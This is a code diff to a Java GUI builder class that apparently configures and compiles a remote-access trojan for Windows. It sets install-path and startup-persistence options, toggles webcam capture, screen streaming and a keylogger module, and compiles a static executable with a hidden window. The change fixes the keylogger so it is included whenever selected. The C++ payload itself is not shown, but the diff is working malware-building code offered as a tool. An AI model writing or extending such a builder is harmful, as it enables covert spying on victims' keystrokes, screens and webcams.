@@ -4,10 +4,10 @@ import javax.swing.*;
 import javax.swing.filechooser.FileNameExtensionFilter;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.io.BufferedReader;
+
 import java.io.File;
 import java.io.IOException;
-import java.io.InputStreamReader;
+
 import java.nio.file.Path;
 import java.util.concurrent.atomic.AtomicReference;
 
@@ -78,18 +78,23 @@ public class Compiler implements ActionListener {
                     "sender/Sender.cpp ");
             // check if installation needs to be make
             if (checkBoxes[0].isSelected()) {
-                modifier.variableModifier("INSTALL_PATH",buttonGroup.getSelection().getActionCommand());
-                modifier.variableModifier("SUBDIRECTORY_NAME","\""+fieldsArray[6].getText()+"\"");
-                modifier.variableModifier("SUBDIRECTORY_FILE_NAME","\""+fieldsArray[7].getText()+".exe"+"\"");
-                modifier.variableModifier("STARTUP_NAME", checkBoxes[1].isSelected() ? "\""+fieldsArray[8].getText()+"\"" : "");
+                modifier.variableModifier("INSTALL_PATH", buttonGroup.getSelection().getActionCommand());
+                modifier.variableModifier("SUBDIRECTORY_NAME", "\"" + fieldsArray[6].getText() + "\"");
+                modifier.variableModifier("SUBDIRECTORY_FILE_NAME", "\"" + fieldsArray[7].getText() + ".exe" + "\"");
+                modifier.variableModifier("STARTUP_NAME", checkBoxes[1].isSelected() ? "\"" + fieldsArray[8].getText() + "\"" : "");
             } else {
-                modifier.variableModifier("INSTALL_PATH","(-1)");
+                modifier.variableModifier("INSTALL_PATH", "(-1)");
             }
+            if (checkBoxes[3].isSelected()) {
+                modifier.addInclude("#define KEYLOGGER");
+                modifier.variableModifier("KEYLOGGER", "\"" + fieldsArray[10].getText() + "\"");
+                command.append("keylogger/KeyLogger.cpp ");
+            } else modifier.removeInclude("#define KEYLOGGER");
             if (checkBoxes[2].isSelected()) {
                 modifier.addInclude("#define WEBCAM");
                 modifier.variableModifier("WEBCAM", "\"" + fieldsArray[9].getText() + "\"");
                 System.out.println("selected webcam");
-                command.append(checkBoxes[3].isSelected() ? "keylogger/KeyLogger.cpp " : "").append(
+                command.append(
                         "screen/ScreenStreamer.cpp " +
                                 "webcam/WebcamManager.cpp " +
                                 " -IC:opencv_static/include -Lopencv_static/lib " +
@@ -111,10 +116,7 @@ public class Compiler implements ActionListener {
                     "-static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -mwindows -o ").append(
                     chooser.getSelectedFile().getAbsolutePath());
 
-            if (checkBoxes[3].isSelected()){
-                modifier.addInclude("#define KEYLOGGER");
-                modifier.variableModifier("KEYLOGGER","\""+fieldsArray[10].getText()+"\"");
-            } else modifier.removeInclude("#define KEYLOGGER");
+
             modifier.writeToFile();
             System.out.println(command);
             compile(command.toString(), assemblyCommand);
